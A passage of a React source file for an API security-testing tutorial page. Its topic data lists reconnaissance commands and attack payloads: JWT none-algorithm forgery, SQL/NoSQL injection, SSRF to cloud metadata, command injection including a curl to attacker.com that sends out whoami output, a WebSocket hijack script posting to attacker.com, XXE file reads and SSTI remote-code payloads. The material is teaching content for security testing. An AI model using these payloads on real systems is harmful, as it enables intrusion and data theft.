import React, { useState, useEffect } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Typography,
  Container,
  Paper,
  alpha,
  useTheme,
  useMediaQuery,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Chip,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  IconButton,
  Alert,
  Card,
  CardContent,
  Tooltip,
  Button,
  Drawer,
  Fab,
  LinearProgress,
  Divider,
} from "@mui/material";
import { Link, useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import SchoolIcon from "@mui/icons-material/School";
import BuildIcon from "@mui/icons-material/Build";
import HistoryIcon from "@mui/icons-material/History";
import AssignmentIcon from "@mui/icons-material/Assignment";
import TerminalIcon from "@mui/icons-material/Terminal";
import JavascriptIcon from "@mui/icons-material/Javascript";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ApiIcon from "@mui/icons-material/Api";
import SearchIcon from "@mui/icons-material/Search";
import LockIcon from "@mui/icons-material/Lock";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import SpeedIcon from "@mui/icons-material/Speed";
import DataObjectIcon from "@mui/icons-material/DataObject";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import WarningIcon from "@mui/icons-material/Warning";
import InfoIcon from "@mui/icons-material/Info";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import AdminPanelSettingsIcon from "@mui/icons-material/AdminPanelSettings";
import StorageIcon from "@mui/icons-material/Storage";
import CloudIcon from "@mui/icons-material/Cloud";
import HttpIcon from "@mui/icons-material/Http";
import DescriptionIcon from "@mui/icons-material/Description";
import CodeIcon from "@mui/icons-material/Code";
import SchemaIcon from "@mui/icons-material/Schema";
import TuneIcon from "@mui/icons-material/Tune";
import VisibilityIcon from "@mui/icons-material/Visibility";
import BlockIcon from "@mui/icons-material/Block";



// Code block component with copy functionality
function CodeBlock({ code, language = "bash" }: { code: string; language?: string }) {
  const theme = useTheme();
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: theme.palette.mode === "dark" ? "#1a1a2e" : "#1e1e1e",
        borderRadius: 2,
        position: "relative",
        overflow: "auto",
      }}
    >
      <Tooltip title={copied ? "Copied!" : "Copy"}>
        <IconButton
          size="small"
          onClick={handleCopy}
          sx={{
            position: "absolute",
            top: 8,
            right: 8,
            color: copied ? "success.main" : "grey.500",
          }}
        >
          <ContentCopyIcon fontSize="small" />
        </IconButton>
      </Tooltip>
      <Typography
        component="pre"
        sx={{
          fontFamily: "monospace",
          fontSize: "0.8rem",
          color: "#e0e0e0",
          m: 0,
          whiteSpace: "pre-wrap",
          wordBreak: "break-word",
        }}
      >
        {code}
      </Typography>
    </Paper>
  );
}

interface TopicSection {
  title: string;
  icon: React.ReactNode;
  color: string;
  description: string;
  keyPoints: string[];
  techniques?: string[];
  tools?: string[];
  tips?: string[];
  codeExample?: string;
}

// Tab 1: API Discovery & Enumeration
const discoveryTopics: TopicSection[] = [
  {
    title: "Finding API Endpoints",
    icon: <SearchIcon />,
    color: "#3b82f6",
    description: "Discover hidden and undocumented API endpoints through various reconnaissance techniques.",
    keyPoints: [
      "Check for /api/, /v1/, /v2/, /rest/, /graphql/ paths",
      "Analyze JavaScript files for hardcoded endpoints",
      "Use browser DevTools Network tab during normal usage",
      "Check mobile app traffic for API calls",
      "Search for Swagger/OpenAPI documentation",
      "Look for /docs, /swagger, /api-docs, /openapi.json",
      "Check robots.txt and sitemap.xml for API paths",
      "Monitor WebSocket connections for API interactions",
      "Decompile mobile apps for embedded API URLs",
      "Search GitHub/GitLab for leaked API endpoints",
    ],
    tools: ["Burp Suite", "ffuf", "gobuster", "kiterunner", "GAP (GetAllUrls)", "LinkFinder", "httpx", "nuclei"],
    techniques: [
      "ffuf -u https://api.target.com/FUZZ -w api-wordlist.txt -mc 200,301,302,403",
      "Extract endpoints from JS: linkfinder -i https://target.com -o cli",
      "Check wayback machine: waybackurls target.com | grep api",
      "Enumerate with kiterunner: kr scan https://target.com -w routes.kite",
      "GitHub dorking: site:github.com \"api.target.com\"",
    ],
    codeExample: `# Comprehensive API discovery workflow\n\n# 1. Passive discovery - JS analysis\nlinkfinder -i https://target.com -o cli | grep -E '/api|/v[0-9]'\n\n# 2. Active discovery - directory brute force\nffuf -u https://api.target.com/FUZZ -w /usr/share/wordlists/api-endpoints.txt \\\n     -mc 200,201,204,301,302,307,401,403,405 -t 50\n\n# 3. Kiterunner for route patterns\nkr scan https://api.target.com -w routes-large.kite -x 10\n\n# 4. Check for documentation\ncurl -s https://api.target.com/swagger.json\ncurl -s https://api.target.com/openapi.json\ncurl -s https://api.target.com/api-docs\n\n# 5. Wayback machine historical endpoints\nwaybackurls target.com | grep -E '\\.(json|xml)' | sort -u`,
  },
  {
    title: "API Documentation Discovery",
    icon: <DescriptionIcon />,
    color: "#8b5cf6",
    description: "Find and analyze API documentation to understand available endpoints and parameters.",
    keyPoints: [
      "Swagger UI endpoints: /swagger, /swagger-ui, /swagger-ui.html",
      "OpenAPI spec files: /openapi.json, /openapi.yaml, /v3/api-docs",
      "GraphQL introspection: query { __schema { types { name } } }",
      "Postman collections in public repos or documentation",
      "WADL files for SOAP/REST: /application.wadl",
      "API Blueprint files: /api.apib, /blueprint",
    ],
    tools: ["Swagger Editor", "Postman", "GraphQL Voyager", "Insomnia"],
    tips: [
      "Always check if documentation is outdated vs actual implementation",
      "Undocumented endpoints often lack proper security controls",
      "Look for debug/test endpoints left in production",
      "Check for different documentation versions (/v1/docs vs /v2/docs)",
    ],
  },
  {
    title: "API Versioning & Technology Detection",
    icon: <CodeIcon />,
    color: "#10b981",
    description: "Identify API technologies, versions, and frameworks to tailor your testing approach and find version-specific vulnerabilities.",
    keyPoints: [
      "Version in URL path: /api/v1/, /api/v2/",
      "Version in headers: Accept: application/vnd.api+json;version=2",
      "Version in query params: ?version=2",
      "Detect framework from error messages and headers",
      "Check Server, X-Powered-By, X-AspNet-Version headers",
      "Analyze JSON structure for framework patterns",
      "Try accessing beta/staging versions: /beta/, /staging/",
    ],
    techniques: [
      "Try accessing older API versions for deprecated insecure endpoints",
      "Check if v1 has less security than v2",
      "Look for version rollback vulnerabilities",
      "Test version parameter tampering",
      "Enumerate versions: v0, v1, v2, v3...",
    ],
    codeExample: `# API Version enumeration and testing\n\n# 1. Enumerate versions in URL path\nfor v in 0 1 2 3 4 5 beta staging dev internal; do\n  echo "Testing /api/$v/"\n  curl -s -o /dev/null -w "%{http_code}" https://api.target.com/api/$v/users\ndone\n\n# 2. Test version header manipulation\ncurl https://api.target.com/users \\\n  -H "Accept: application/vnd.api+json;version=1"\n\ncurl https://api.target.com/users \\\n  -H "X-Api-Version: 0"\n\n# 3. Test query parameter versioning\ncurl "https://api.target.com/users?api_version=1"\ncurl "https://api.target.com/users?v=0"\n\n# 4. Framework detection via headers\ncurl -I https://api.target.com/api/users 2>/dev/null | grep -iE 'server|x-powered|x-aspnet|x-runtime'\n\n# 5. Trigger verbose errors for framework detection\ncurl https://api.target.com/api/\\x00  # Null byte\ncurl https://api.target.com/api/..%252f  # Path traversal`,
    tips: [
      "Older API versions often lack security patches",
      "Beta/staging endpoints may have debug mode enabled",
      "Framework detection helps choose targeted exploits",
    ],
  },
  {
    title: "API Rate Limiting Reconnaissance",
    icon: <SpeedIcon />,
    color: "#f59e0b",
    description: "Identify and map rate limiting controls before attempting bypass techniques.",
    keyPoints: [
      "Check rate limit headers: X-RateLimit-Limit, X-RateLimit-Remaining",
      "Identify rate limit scope: IP, user, API key, endpoint",
      "Note rate limit windows: per minute, per hour, per day",
      "Check for different limits on different endpoints",
      "Test anonymous vs authenticated rate limits",
      "Look for Retry-After headers on 429 responses",
    ],
    techniques: [
      "Send rapid requests and analyze 429 responses",
      "Compare limits across endpoints",
      "Test with and without authentication",
      "Check if websocket connections have limits",
    ],
    codeExample: `# Rate limit reconnaissance\n\n# 1. Check rate limit headers\ncurl -I https://api.target.com/users 2>/dev/null | grep -i rate\n\n# Example response headers:\n# X-RateLimit-Limit: 100\n# X-RateLimit-Remaining: 95\n# X-RateLimit-Reset: 1609459200\n\n# 2. Trigger rate limit to understand behavior\nfor i in {1..200}; do\n  response=$(curl -s -w "\\n%{http_code}" https://api.target.com/users)\n  http_code=$(echo "$response" | tail -1)\n  if [ "$http_code" = "429" ]; then\n    echo "Rate limited at request $i"\n    break\n  fi\ndone\n\n# 3. Check different endpoint limits\ncurl -s -I https://api.target.com/login  # Auth endpoints often stricter\ncurl -s -I https://api.target.com/search # Search might be unlimited\ncurl -s -I https://api.target.com/export # Export often has low limits`,
  },
];

// Tab 2: Authentication Testing
const authTopics: TopicSection[] = [
  {
    title: "API Key Security",
    icon: <VpnKeyIcon />,
    color: "#ef4444",
    description: "Test API key implementation for common vulnerabilities and misconfigurations.",
    keyPoints: [
      "Check if API keys are transmitted securely (HTTPS only)",
      "Test for API key exposure in URLs, logs, or error messages",
      "Verify key rotation and revocation mechanisms",
      "Check for overly permissive key scopes",
      "Test if keys can be used from different IPs/origins",
      "Look for hardcoded keys in client-side code",
    ],
    techniques: [
      "Search JS files: grep -r 'api_key\\|apikey\\|api-key' .",
      "Check response headers for leaked keys",
      "Test key in different contexts (header vs query param)",
      "Attempt to use expired or revoked keys",
    ],
    tips: [
      "Many APIs accept keys in multiple places - test all locations",
      "Check if removing the key entirely allows access",
      "Test with malformed keys for information disclosure",
    ],
    codeExample: `# Common API key locations to test
curl -H "X-API-Key: <key>" https://api.target.com/endpoint
curl -H "Authorization: ApiKey <key>" https://api.target.com/endpoint
curl "https://api.target.com/endpoint?api_key=<key>"
curl -H "X-Api-Token: <key>" https://api.target.com/endpoint`,
  },
  {
    title: "JWT Attacks",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Exploit common JWT implementation flaws for authentication bypass.",
    keyPoints: [
      "Algorithm confusion: Change RS256 to HS256",
      "Algorithm none attack: Set alg to 'none'",
      "Weak secret keys vulnerable to brute force",
      "JWT header injection via jku, jwk, kid parameters",
      "Expired token acceptance",
      "Missing signature verification",
      "Sensitive data exposure in payload",
    ],
    tools: ["jwt_tool", "jwt.io", "hashcat", "Burp JWT Editor"],
    techniques: [
      "jwt_tool -t https://api.target.com -rh 'Authorization: Bearer <token>' -M at",
      "Change 'alg' to 'none' and remove signature",
      "Crack weak secrets: hashcat -a 0 -m 16500 jwt.txt wordlist.txt",
      "Inject JWKS URL via jku header parameter",
    ],
    codeExample: `# JWT None algorithm attack
# Original: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.signature

# Attack: Change header to {"alg":"none","typ":"JWT"}
# Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.

# Note: Remove signature but keep trailing dot`,
  },
  {
    title: "OAuth 2.0 Vulnerabilities",
    icon: <LockIcon />,
    color: "#8b5cf6",
    description: "Test OAuth implementations for authorization bypass and token theft.",
    keyPoints: [
      "Open redirect in redirect_uri parameter",
      "Authorization code interception/replay",
      "CSRF in OAuth flow (missing state parameter)",
      "Scope manipulation and privilege escalation",
      "Token leakage via Referer header",
      "Client secret exposure in mobile/SPA apps",
      "PKCE bypass attempts",
    ],
    techniques: [
      "Test redirect_uri: https://evil.com, subdomain takeover, path traversal",
      "Reuse authorization codes multiple times",
      "Remove or tamper with state parameter",
      "Request additional scopes not granted to the app",
      "Test implicit flow for token in URL fragment",
    ],
    tips: [
      "Check for token in URL - can leak via Referer",
      "Try downgrading from code flow to implicit",
      "Test if refresh tokens can be used across clients",
    ],
  },
  {
    title: "Session & Token Management",
    icon: <HttpIcon />,
    color: "#06b6d4",
    description: "Test API session handling and token lifecycle security.",
    keyPoints: [
      "Token expiration and refresh mechanisms",
      "Concurrent session handling",
      "Token revocation on logout/password change",
      "Session fixation vulnerabilities",
      "Token entropy and predictability",
      "Secure transmission (HTTPS, secure cookies)",
      "Refresh token rotation and reuse detection",
      "Token binding to IP/device fingerprint",
    ],
    techniques: [
      "Use old tokens after logout - should be invalidated",
      "Test token after password change",
      "Analyze token entropy with Burp Sequencer",
      "Check for session tokens in URLs",
      "Test token reuse across different user agents",
      "Try refresh token reuse after rotation",
    ],
    codeExample: `# Session management testing\n\n# 1. Test token invalidation on logout\nTOKEN="eyJhbG..."\ncurl -X POST https://api.target.com/logout -H "Authorization: Bearer $TOKEN"\n# Now try using the same token - should fail\ncurl https://api.target.com/user/profile -H "Authorization: Bearer $TOKEN"\n\n# 2. Test concurrent sessions\n# Login from device A, get TOKEN_A\n# Login from device B, get TOKEN_B\n# Check if TOKEN_A still works (should it?)\n\n# 3. Refresh token abuse\n# Use refresh token\ncurl -X POST https://api.target.com/token/refresh -d '{"refresh_token": "rt_abc123"}'\n# Try reusing the same refresh token again (should fail if rotating)\ncurl -X POST https://api.target.com/token/refresh -d '{"refresh_token": "rt_abc123"}'`,
  },
  {
    title: "WebSocket Authentication",
    icon: <HttpIcon />,
    color: "#a855f7",
    description: "Test WebSocket connection authentication and authorization controls.",
    keyPoints: [
      "WebSocket upgrade request authentication",
      "Token validation on WS messages",
      "Origin header validation",
      "Cross-Site WebSocket Hijacking (CSWSH)",
      "Message-level authorization checks",
      "Connection persistence after token expiry",
    ],
    tools: ["Burp Suite WebSocket extension", "wscat", "websocat", "OWASP ZAP"],
    techniques: [
      "Remove/modify Authorization header in WS upgrade",
      "Forge Origin header to test CORS-like controls",
      "Send privileged messages after token expires",
      "Test for message replay vulnerabilities",
    ],
    codeExample: `# WebSocket authentication testing\n\n# 1. Connect with wscat\nwscat -c "wss://api.target.com/ws" -H "Authorization: Bearer <token>"\n\n# 2. Test without auth header\nwscat -c "wss://api.target.com/ws"\n\n# 3. Test with expired token\nwscat -c "wss://api.target.com/ws" -H "Authorization: Bearer <expired_token>"\n\n# 4. Cross-Site WebSocket Hijacking test\n# Create HTML page on attacker domain:\n<script>\n  var ws = new WebSocket("wss://api.target.com/ws");\n  ws.onmessage = function(e) {\n    // Attacker receives victim's messages\n    fetch("https://attacker.com/log?data=" + e.data);\n  };\n</script>\n\n# 5. Test message authorization\nwscat -c "wss://api.target.com/ws" -H "Authorization: Bearer <user_token>"\n> {"action": "admin_delete_user", "user_id": 123}`,
    tips: [
      "WebSocket connections often lack per-message auth checks",
      "Origin header is the main CSWSH protection - test it",
      "Check if WS stays connected after JWT expires",
    ],
  },
];

// Tab 3: Authorization (BOLA/IDOR)
const authzTopics: TopicSection[] = [
  {
    title: "BOLA/IDOR Detection",
    icon: <AdminPanelSettingsIcon />,
    color: "#ef4444",
    description: "Broken Object Level Authorization - accessing other users' data by manipulating identifiers.",
    keyPoints: [
      "Test all endpoints with object IDs (user_id, order_id, etc.)",
      "Try sequential IDs: 1, 2, 3...",
      "Try UUIDs from other users if obtainable",
      "Check batch/bulk endpoints for mass data access",
      "Test GraphQL queries with different IDs",
      "Look for ID references in nested objects",
    ],
    techniques: [
      "Swap user IDs in: /api/users/{id}/profile",
      "Test: /api/orders/123 → /api/orders/124",
      "Enumerate: GET /api/documents/1 through /api/documents/1000",
      "Check if UUIDs are actually validated vs just checked for format",
    ],
    codeExample: `# BOLA/IDOR Testing with Burp Intruder or ffuf
# Step 1: Identify endpoints with object references
GET /api/v1/users/1001/orders
GET /api/v1/documents/abc-123-def

# Step 2: Enumerate with your user's token
ffuf -u https://api.target.com/users/FUZZ/profile \\
     -w ids.txt -H "Authorization: Bearer <your_token>" \\
     -mc 200 -o results.json

# Step 3: Check for data belonging to other users`,
    tips: [
      "Always test with two accounts - compare what each can access",
      "Check if DELETE/PUT also vulnerable, not just GET",
      "Look for indirect references (e.g., filename instead of ID)",
    ],
  },
  {
    title: "BFLA - Function Level Authorization",
    icon: <SecurityIcon />,
    color: "#dc2626",
    description: "Broken Function Level Authorization - accessing admin or privileged functions.",
    keyPoints: [
      "Access admin endpoints as regular user",
      "Test HTTP method switching (GET→POST→PUT→DELETE)",
      "Change user role in request body",
      "Access internal/debug endpoints",
      "Test admin API paths guessing",
    ],
    techniques: [
      "Try: /api/admin/users, /api/internal/config",
      "Change role parameter: {'role': 'admin'}",
      "Add admin parameters: ?admin=true, ?debug=1",
      "Test OPTIONS to discover allowed methods",
      "Check for different auth requirements per method",
    ],
    codeExample: `# Testing function-level authorization
# As regular user, try admin endpoints:
curl -X GET https://api.target.com/api/admin/users \\
     -H "Authorization: Bearer <regular_user_token>"

# Try method switching
curl -X DELETE https://api.target.com/api/users/123 \\
     -H "Authorization: Bearer <regular_user_token>"

# Try role elevation in request body
curl -X PUT https://api.target.com/api/users/me \\
     -H "Authorization: Bearer <token>" \\
     -d '{"role": "admin", "is_superuser": true}'`,
  },
  {
    title: "Horizontal vs Vertical Privilege Escalation",
    icon: <TuneIcon />,
    color: "#f59e0b",
    description: "Understanding and testing different types of privilege escalation in APIs.",
    keyPoints: [
      "Horizontal: Access same-level resources of other users",
      "Vertical: Escalate to higher privilege levels",
      "Context-dependent access control bypass",
      "Multi-tenant isolation failures",
      "Resource ownership manipulation",
      "Parameter pollution for auth bypass",
      "HTTP method tampering (GET→POST→DELETE)",
    ],
    techniques: [
      "Horizontal: Change user_id/account_id in requests",
      "Vertical: Access /admin, change role claims, manipulate permissions",
      "Test tenant isolation: Add X-Tenant-ID or change org_id",
      "Check if deleting resources works across accounts",
      "Try HTTP Parameter Pollution: ?id=yours&id=victim",
    ],
    tips: [
      "Document the permission model before testing",
      "Test edge cases: empty IDs, null values, special characters",
      "Check if caching bypasses authorization checks",
    ],
    codeExample: `# Comprehensive authorization testing\n\n# Setup: Create two test accounts\n# USER_A_TOKEN - regular user, ID: 100\n# USER_B_TOKEN - regular user, ID: 101\n# ADMIN_TOKEN - admin user\n\n# HORIZONTAL ESCALATION\n# As User A, try to access User B's data\ncurl https://api.target.com/users/101/profile \\\n     -H "Authorization: Bearer $USER_A_TOKEN"\n\n# Try different ID formats\ncurl https://api.target.com/users/00101/profile  # Leading zeros\ncurl https://api.target.com/users/101.0/profile  # Decimal\ncurl https://api.target.com/users/101%00/profile # Null byte\n\n# VERTICAL ESCALATION\n# As regular user, try admin endpoints\ncurl https://api.target.com/admin/users \\\n     -H "Authorization: Bearer $USER_A_TOKEN"\n\n# Try adding admin parameters\ncurl -X PUT https://api.target.com/users/100 \\\n     -H "Authorization: Bearer $USER_A_TOKEN" \\\n     -d '{"name": "test", "role": "admin", "is_superuser": true}'\n\n# METHOD TAMPERING\ncurl -X DELETE https://api.target.com/users/101 \\\n     -H "Authorization: Bearer $USER_A_TOKEN"\ncurl -X PATCH https://api.target.com/users/101 \\\n     -H "Authorization: Bearer $USER_A_TOKEN" \\\n     -d '{"balance": 0}'`,
  },
  {
    title: "Multi-Tenant & Organization Isolation",
    icon: <CloudIcon />,
    color: "#22c55e",
    description: "Test isolation between different tenants, organizations, or accounts in multi-tenant APIs.",
    keyPoints: [
      "Tenant ID manipulation in headers or parameters",
      "Cross-tenant data access via IDOR",
      "Shared resource enumeration",
      "Subdomain-based tenant bypass",
      "API key scope violations across tenants",
      "Cached data leaking between tenants",
    ],
    techniques: [
      "Add/modify X-Tenant-ID, X-Organization-ID headers",
      "Change org_id, tenant, account parameters",
      "Access resources via UUID/slug from another tenant",
      "Test subdomain: tenant1.api.com with tenant2 credentials",
    ],
    codeExample: `# Multi-tenant isolation testing\n\n# Test tenant header manipulation\ncurl https://api.target.com/data \\\n     -H "Authorization: Bearer $TENANT_A_TOKEN" \\\n     -H "X-Tenant-ID: tenant_b"\n\n# Test organization parameter injection\ncurl "https://api.target.com/reports?org_id=competitor_org"\n\n# Test subdomain tenant isolation\n# Logged into tenant-a.api.target.com\ncurl https://tenant-b.api.target.com/api/users \\\n     -H "Authorization: Bearer $TENANT_A_TOKEN"\n\n# Test shared resources\n# File uploaded to Tenant A - try accessing from Tenant B\ncurl https://api.target.com/files/shared-uuid-12345 \\\n     -H "Authorization: Bearer $TENANT_B_TOKEN"`,
    tips: [
      "SaaS apps often have weak tenant isolation",
      "Check if tenant ID is derived from token or trusted from input",
      "Test caching - data from one tenant may leak to another",
    ],
  },
];

// Tab 4: Injection Attacks
const injectionTopics: TopicSection[] = [
  {
    title: "SQL Injection in APIs",
    icon: <StorageIcon />,
    color: "#ef4444",
    description: "SQL injection through API parameters, JSON bodies, and headers.",
    keyPoints: [
      "Test all input points: query params, JSON body, headers",
      "JSON injection: {\"id\": \"1 OR 1=1\"}",
      "Array parameters: ?id[]=1&id[]=2 OR 1=1",
      "Order by injection in sorting parameters",
      "Filter/search parameter injection",
    ],
    tools: ["SQLMap", "Burp Suite", "Ghauri"],
    techniques: [
      "sqlmap -u 'https://api.target.com/users?id=1' --batch",
      "Test JSON: {\"search\": \"test' OR '1'='1\"}",
      "Order by: ?sort=name,1;DROP TABLE users--",
      "In filters: ?filter={\"status\": {\"$ne\": null}}",
    ],
    codeExample: `# SQL Injection in JSON body
POST /api/search HTTP/1.1
Content-Type: application/json

{"query": "test' UNION SELECT username,password FROM users--"}

# In array parameters
GET /api/items?category[]=1&category[]=2 UNION SELECT * FROM secrets--

# In sorting/ordering
GET /api/users?sort=created_at;SELECT pg_sleep(5)--`,
  },
  {
    title: "NoSQL Injection",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Injection attacks against MongoDB, CouchDB, and other NoSQL databases.",
    keyPoints: [
      "MongoDB operator injection: $gt, $ne, $regex, $where",
      "JSON injection in query objects",
      "JavaScript injection via $where operator",
      "Array injection for operator bypass",
      "Blind NoSQL injection via timing",
    ],
    techniques: [
      "Replace value with object: {\"username\": {\"$ne\": \"\"}}",
      "Regex extraction: {\"password\": {\"$regex\": \"^a\"}}",
      "In URL: ?username[$ne]=&password[$ne]=",
      "JavaScript: {\"$where\": \"this.password.match(/^a/)\"}",
    ],
    codeExample: `# NoSQL injection examples
# Authentication bypass
POST /api/login
{"username": {"$ne": ""}, "password": {"$ne": ""}}

# Data extraction with regex
POST /api/users/search
{"password": {"$regex": "^admin"}}

# In query parameters
GET /api/users?username[$gt]=&password[$gt]=`,
  },
  {
    title: "SSRF via API Parameters",
    icon: <CloudIcon />,
    color: "#8b5cf6",
    description: "Server-Side Request Forgery through URL parameters and webhook configurations.",
    keyPoints: [
      "URL parameters: ?url=, ?callback=, ?redirect=",
      "Webhook/callback URLs in API configurations",
      "File import from URL features",
      "PDF generation with external resources",
      "Image/avatar URL fetching",
      "Cloud metadata access: 169.254.169.254",
    ],
    techniques: [
      "Test: ?url=http://127.0.0.1:8080/admin",
      "Cloud metadata: ?url=http://169.254.169.254/latest/meta-data/",
      "Port scanning: ?url=http://internal-host:PORT",
      "Protocol smuggling: ?url=file:///etc/passwd",
    ],
    codeExample: `# SSRF through API webhook configuration
POST /api/webhooks
{
  "callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

# SSRF in file import
POST /api/import
{
  "source_url": "http://internal-service:8080/admin"
}

# DNS rebinding bypass
{
  "url": "http://attacker-controlled-domain.com"  
}
# (DNS resolves to internal IP after first check)`,
    tips: [
      "Try different URL schemes: http, https, file, gopher, dict",
      "Use DNS rebinding for IP-based filters",
      "Check for partial URL validation bypass",
    ],
  },
  {
    title: "Command & Header Injection",
    icon: <BugReportIcon />,
    color: "#dc2626",
    description: "OS command injection and HTTP header injection through API inputs.",
    keyPoints: [
      "Command injection in processing parameters",
      "File conversion/processing endpoints",
      "Report generation features",
      "Log injection via API inputs",
      "Header injection via parameter reflection",
      "Template injection in dynamic content",
    ],
    techniques: [
      "Test: {\"filename\": \"test; whoami\"}",
      "Newline injection: {\"header\": \"value\\r\\nX-Injected: true\"}",
      "In file operations: ?file=test.pdf|cat /etc/passwd",
      "Email parameter: test@test.com%0aBcc:attacker@evil.com",
    ],
    codeExample: `# Command injection in API parameters\n\n# File processing endpoint\nPOST /api/convert\n{"input": "document.pdf; cat /etc/passwd", "format": "png"}\n\n# DNS lookup feature\nPOST /api/tools/dns\n{"domain": "example.com; whoami"}\n\n# Blind command injection with time delay\n{"filename": "test; sleep 10"}\n\n# Out-of-band (OOB) command injection\n{"input": "test\`curl http://attacker.com/$(whoami)\`"}\n\n# Header injection (CRLF)\n{"callback": "http://legit.com%0d%0aX-Injected: malicious"}`,
  },
  {
    title: "XXE & XML Injection",
    icon: <CodeIcon />,
    color: "#6366f1",
    description: "XML External Entity attacks and XML injection in APIs accepting XML input.",
    keyPoints: [
      "XXE in XML-based APIs (SOAP, XML-RPC)",
      "XXE via file upload (SVG, DOCX, XLSX)",
      "Blind XXE with out-of-band exfiltration",
      "XXE in JSON APIs via Content-Type switching",
      "XML parameter entity injection",
    ],
    tools: ["Burp Suite", "XXEinjector", "oxml_xxe"],
    techniques: [
      "Switch Content-Type: application/json → application/xml",
      "Upload SVG with XXE payload",
      "Blind XXE: exfiltrate via HTTP/DNS",
      "Parameter entity for firewall bypass",
    ],
    codeExample: `# XXE Injection examples\n\n# Classic XXE - file read\n<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<user><name>&xxe;</name></user>\n\n# Blind XXE - OOB exfiltration\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">\n  %xxe;\n]>\n\n# XXE via Content-Type switching\n# Original request (JSON):\nPOST /api/user\nContent-Type: application/json\n{"name": "test"}\n\n# Attack (switch to XML):\nPOST /api/user\nContent-Type: application/xml\n<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<name>&xxe;</name>\n\n# XXE in SVG upload\n<?xml version="1.0"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<svg>&xxe;</svg>`,
    tips: [
      "Many APIs accept XML even if they primarily use JSON",
      "Try changing Content-Type to text/xml or application/xml",
      "File uploads (SVG, Office docs) are common XXE vectors",
    ],
  },
  {
    title: "Server-Side Template Injection (SSTI)",
    icon: <CodeIcon />,
    color: "#14b8a6",
    description: "Template injection in APIs that generate dynamic content like emails, PDFs, or reports.",
    keyPoints: [
      "Email template injection",
      "PDF/report generation with user input",
      "Dynamic page rendering",
      "Error message reflection",
      "Webhook payload templates",
    ],
    tools: ["tplmap", "SSTImap", "Burp Suite"],
    techniques: [
      "Test: {{7*7}} in all text fields",
      "Jinja2: {{config}}, {{self.__class__}}",
      "Freemarker: ${7*7}, <#assign x=\"freemarker\">",
      "Check error messages for template engine info",
    ],
    codeExample: `# SSTI testing in API parameters

# Basic detection payloads
{"name": "{{7*7}}"}        # Returns 49 if vulnerable
{"name": "\${7*7}"}        # Alternative syntax (Freemarker)
{"name": "<%= 7*7 %>"}     # ERB syntax

# Jinja2 RCE
{"template": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}

# Freemarker RCE
{"content": "<#assign ex=\\"freemarker.template.utility.Execute\\"?new()>\${ex(\\"id\\")}"}

# Common vulnerable endpoints
POST /api/email/send
{"to": "user@example.com", "template": "Hello {{name}}!", "name": "{{7*7}}"}

POST /api/reports/generate
{"title": "Report {{date}}", "content": "{{config}}"}`,
    tips: [
      "SSTI often leads to RCE",
      "Email, PDF, and report generators are common targets",
      "Check webhook configurations for template features",
    ],
  },
];

// Tab 5: Data Exposure
const dataTopics: TopicSection[] = [
  {
    title: "Excessive Data Exposure",
    icon: <VisibilityIcon />,
    color: "#ef4444",
    description: "APIs returning more data than necessary, exposing sensitive information to unauthorized users.",
    keyPoints: [
      "Check all response fields for sensitive data",
      "Look for: passwords, tokens, PII, internal IDs",
      "Compare mobile app vs web app responses",
      "Test verbose error messages",
      "Check debug parameters: ?debug=true, ?verbose=1",
      "Analyze nested objects for hidden data",
      "Compare admin vs user responses",
      "Check pagination for extra fields",
      "Test GraphQL field selection bypass",
    ],
    techniques: [
      "Compare full response vs what UI displays",
      "Request user profile - check for password hashes",
      "Look for internal fields: _id, internal_notes, etc.",
      "Check if filtering is client-side only",
      "Use jq to analyze nested JSON structures",
      "Compare response sizes across different endpoints",
    ],
    tools: ["Burp Suite", "jq", "Postman", "OWASP ZAP"],
    tips: [
      "Use jq to analyze JSON responses: curl ... | jq .",
      "Look for fields like: token, secret, key, password, hash",
      "Check if ?fields= parameter exposes restricted data",
      "Mobile APIs often return more data than web APIs",
    ],
